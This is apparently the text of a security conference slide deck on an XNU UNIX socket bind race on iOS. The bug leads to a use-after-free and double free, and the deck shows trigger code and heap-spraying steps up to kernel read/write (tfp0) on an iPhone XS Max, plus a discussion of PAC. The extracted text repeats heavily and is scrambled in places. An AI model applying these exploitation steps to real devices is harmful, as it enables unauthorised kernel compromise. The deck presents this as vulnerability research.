Attacking iPhone XS Max
Tielei Wang and Hao Xu

About us
· Tielei Wang and Hao Xu (@windknown) · Co-founders of Team Pangu · Known for releasing jailbreak tools for iOS 7-9 · Organizers of MOSEC (Mobile Security Conference) at Shanghai

Outline
· UNIX Socket Bind Race Vulnerability in XNU · PAC Implementation and Effectiveness · Exploit the Bug on iPhone XS Max · Conclusion

Unix Domain Socket
· A UNIX socket is an inter-process communication mechanism that allows
bidirectional data exchange between processes running on the same machine.

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);
/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Read from the socket. */ read(sock, buf, 1024);
close(sock);
A simple server

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to write. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);
/* Connect the socket to the path. */ connect(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Write to the socket. */ write(sock, buf, 1024);
close(sock);
A simple client

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);
/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Read from the socket. */ read(sock, buf, 1024);
close(sock);
A simple server

From the kernel point of view

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);
/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Read from the socket. */ read(sock, buf, 1024);
close(sock);
A simple server

please refer to xnu source code for more details
socket socket_common socreate_internal soalloc unp_attach
From the kernel point of view

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);
/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Read from the socket. */ read(sock, buf, 1024);
close(sock);
A simple server

proc_t 
p_fd ...
struct fileglob ...
fg_data ...

struct filedesc
fd_ofiles ...

struct fileproc * 0 struct fileproc * 1 struct fileproc * 2
...
struct fileproc *

struct fileproc
... f_fglob
...

struct socket
so_proto so_pcb
 so_usecount

struct unpcb
... unp_socket unp_vnode
...

struct protosw

... pr_lock pr_unlock
...

a number of function pointers

From the kernel point of view

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);
/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Read from the socket. */ read(sock, buf, 1024);
close(sock);
A simple server

struct socket
so_proto so_pcb
 so_usecount

struct unpcb
... unp_socket unp_vnode
...

From the kernel point of view

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);
/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Read from the socket. */ read(sock, buf, 1024);
close(sock);
A simple server

bind sobindlock socket_lock unp_bind socket_unlock
From the kernel point of view

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);
/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Read from the socket. */ read(sock, buf, 1024);
close(sock);

Note that unp_bind is surrounded by socket_(un)lock so it is unraceable?
bind sobindlock socket_lock unp_bind socket_unlock

A simple server

From the kernel point of view

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);
/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Read from the socket. */ read(sock, buf, 1024);
close(sock);
A simple server

struct socket
so_proto so_pcb
 so_usecount

struct unpcb ...
unp_socket unp_vnode
...
struct vnode VSOCK v_socket ...

From the kernel point of view

Race Condition
· The creation of a vnode is time
consuming
· unp_bind has a temporary unlock

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);
/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Read from the socket. */ read(sock, buf, 1024);
close(sock);
A simple server

bind

This unlock makes bind raceable

sobindlock socket_lock

unp_bind

socket_unlock

vnode_create

socket_lock

vp->v_socket = unp->unp_socket; unp->unp_vnode = vp;

socket_unlock

From the kernel point of view

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);

/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);

/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));

/* Read from the socket. */ read(sock, buf, 1024);
close(sock);

Thread 1

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "2.txt"); name.sun_len = strlen(name.sun_path);
/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Read from the socket. */
Threraeda(dsoc2k, buf, 1024);
close(sock);

bind the socket to two file paths in parallel

struct socket
so_proto so_pcb
 so_usecount

struct unpcb
... unp_socket unp_vnode
...

we can make a socket binding to two vnodes (two references)

struct vnode VSOCK v_socket ...
struct vnode VSOCK v_socket ...
bind the socket to two file paths in parallel

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);
/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Read from the socket. */ read(sock, buf, 1024);
close(sock);
A simple server

close soo_close soclose
From the kernel point of view

int sock; struct sockaddr_un name; char buf[1024]; /* Create socket from which to read. */ sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Create name. */ name.sun_family = AF_UNIX; strcpy(name.sun_path, "1.txt"); name.sun_len = strlen(name.sun_path);
/* Bind socket to the path. */ bind(sock, (struct sockaddr *)&name,
SUN_LEN(&name));
/* Read from the socket. */ read(sock, buf, 1024);
close(sock);
A simple server

One of the vnodes will hold a dangling pointer

freed memory
so_proto so_pcb
 so_usecount

freed memory
... unp_socket unp_vnode
...

struct vnode VSOCK 0 ...
struct vnode VSOCK v_socket ...
From the kernel point of view

int sock; sock = socket(AF_UNIX, SOCK_DGRAM, 0);
/* Connect the socket to the path1. */ connect(sock, (struct sockaddr *)&name1,
SUN_LEN(&name)); /* Connect the socket to the path2. */ connect(sock, (struct sockaddr *)&name2,
SUN_LEN(&name));

connect 

unp_connect

Trigger UAF by connecting two names

From the kernel point of view

freed memory
so_proto so_pcb
 so_usecount

freed memory
... unp_socket unp_vnode
...

struct vnode VSOCK 0 ...
struct vnode VSOCK v_socket ...
The dangling pointer in one of the vnodes will pass into socket_lock()

sock = socket(AF_UNIX, SOCK_DGRAM, 0); sock2 = socket(AF_UNIX, SOCK_DGRAM, 0);

in parallel

bind(sock, (struct sockaddr *) &server1, sizeof(struct sockaddr_un)))

bind(sock, (struct sockaddr *) &server2, sizeof(struct sockaddr_un)))

close(sock)
connect(sock2, (struct sockaddr *) &server1, sizeof(struct sockaddr_un)) connect(sock2, (struct sockaddr *) &server2, sizeof(struct sockaddr_un))
The race condition bug results in a UAF

UAF, let's look at the USE

UAF, let's look at the USE
fetch and call a function pointer through two deferences to a freed socket

UAF, let's look at the USE

fetch and call a function pointer through two deferences to a freed socket

save a return address to the freed socket

Binary version may be better

fetch and call a function pointer through two deferences to a freed socket

save a return address to the freed socket

The fix
· Fixed in iOS 12.2
· Still raceable, but adding extra checks to make sure two vnodes will only
keep one reference to the socket
· No public CVE
if(unp->unp_vnode==NULL){ vp->v_socket = unp->unp_socket; unp->unp_vnode = vp;
}

Outline
· UNIX Socket Bind Race Vulnerability in XNU · PAC Implementation and Effectiveness · Exploit the Bug on iPhone XS Max · Conclusion

How could PAC change the game?

(*so->so_proto->pr_lock)(so, refcount, lr_saved);

Instructions on old devices

Instructions on A12 devices

Hijack control flow by controlling X8 Cannot hijack control flow by controlling X8

Much excellent research and disclosure
· Ivan Krsti. Behind the scenes of iOS and Mac Security, Blackhat USA 2019. · Brandon Azad, A study in PAC, MOSEC 2019. · Bradon Azad, https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-
on.html
· Ian Beer, Escaping userspace sandboxes with PAC, https://googleprojectzero.blogspot.com/2019/04/
splitting-atoms-in-xnu.html
· Marco Grassi and Liang Chen, 2PAC 2Furious: Envisioning an iOS Compromise in 2019, Infiltrate 2019. · Xiaolong Bai and Min Zheng, HackPac: Hacking Pointer Authentication in iOS User Space, Defcon 2019. · Qualcomm, https://www.qualcomm.com/media/documents/files/whitepaper-pointer-authentication-
on-armv8-3.pdf

PAC (Pointer Authentication Code)

· Introduced in ARM v8.3
· Hardware based solution for pointer integrity
· Encode authentication code in unused bits of a pointer, and verify the code
before using the pointer

25

39

a 64bits pointer

PAC (Pointer Authentication Code)

25

39

modifier

PAC* instructions

APDAKey APDBKey APIAKey APIBKey APGAKey

PAC'ed pointer

PAC (Pointer Authentication Code)
PAC'ed pointer

modifier

AUT* instructions

APDAKey APDBKey APIAKey APIBKey APGAKey

original pointer

PAC (Pointer Authentication Code)
PAC'ed pointer

modifier

AUT* instructions

APDAKey APDBKey APIAKey APIBKey APGAKey

invalid pointer with error code

(*so->so_proto->pr_lock)(so, refcount, lr_saved);
BLRAAZ = AUTIAZ + BLR Filling X8 with arbitrary code gadget, AUTIAZ will yield an invalid address, leading to a kernel panic

Outline
· UNIX Socket Bind Race Vulnerability in XNU · PAC Implementation and Effectiveness · Exploit the Bug on iPhone XS Max · Conclusion

Recap
int sock; sock = socket(AF_UNIX, SOCK_DGRAM, 0); /* Connect the socket to the path1. */ connect(sock, (struct sockaddr *)&name1,
SUN_LEN(&name)); /* Connect the socket to the path2. */ connect(sock, (struct sockaddr *)&name2,
SUN_LEN(&name));

connect 

unp_connect

Trigger UAF by connecting two names

From the kernel point of view

Take another look at unp_connect
First use of the freed socket
Note that we can safely return from socket_lock, if we avoid the function pointer call

Take another look at unp_connect
Second use of the freed socket

UAF, let's look at the second USE
struct socket
so_proto so_pcb
 so_usecount
socket_unlock is very similar to socket_lock, except when so->so_usecount turns to 0

sofreelastref
· sofreelastref has a lot of cleanup, but eventually calls kfree
socket_unlock sofreelastref sodealloc FREE_ZONE kfree
The race condition bug results in a UAF The UAF results in a double free

Create a number of sockets

Exploit the race condition in unp_bind to construct two vnodes holding a dangling pointer, pointing to one of the sockets
struct vnode VSOCK 0 ...
struct vnode VSOCK v_socket ...

Close all the sockets, and trigger zone_gc()
struct vnode VSOCK 0 ...
struct vnode VSOCK v_socket ...

a fixed or leaked heap address
Spray controllable data (fake sockets), make sure offset 0x18 in fake sockets pointing to a fixed/leaked heap address

+0x18

struct vnode
VSOCK 0 ...
struct vnode VSOCK v_socket ...

a fixed or leaked heap address

0

0

+0x68 +0x70

Connect to the two vnodes.

Avoid invoking the two function pointers, and

go to kfree in sofreelastref.

The OSdata is freed now, as if it were a socket
struct vnode
VSOCK 0 ...

+0x18

struct vnode VSOCK v_socket ...

+0x18

a fixed or leaked heap address

0

0

+0x68 +0x70

Spray a number of OOL ports descriptors via mach_msg. Occupy the freed OSData with OOL ports buffer

mach_msg_ool_ports_descriptor_t
struct vnode VSOCK 0 ...
struct vnode VSOCK v_socket ...

Free all the OSData

a fixed or leaked heap address

0

0

+0x68 +0x70

The OOL ports buffer is freed, as if it were OSData

mach_msg_ool_ports_descriptor_t
struct vnode VSOCK 0 ...
struct vnode VSOCK v_socket ...

a fixed or leaked heap address
fake port
Spray a number of OSData again. Occupy the freed OOL ports buffer, and refill with a pointer pointing to a fake port struct
mach_msg_ool_ports_descriptor_t
struct vnode VSOCK 0 ...
struct vnode VSOCK v_socket ...

fake port
Build a fake kernel task object, we gain an arbitrary kernel read and write (tfp0)
Kernel

mach_port_t
Receive all the mach messages, gain a send right to a fake port
So far so good. Can we win the game without a fight with PAC?
Userspace

Got ssh on iPhone XS Max

Outline
· UNIX Socket Bind Race Vulnerability in XNU · PAC Implementation and Effectiveness · Exploit the Bug on iPhone XS Max · Conclusion

Conclusion
· Temporary unlock is becoming a source of race condition bugs · PAC is great, but does not block all kinds of bugs · A good design needs a good, complete implementation

THANKS

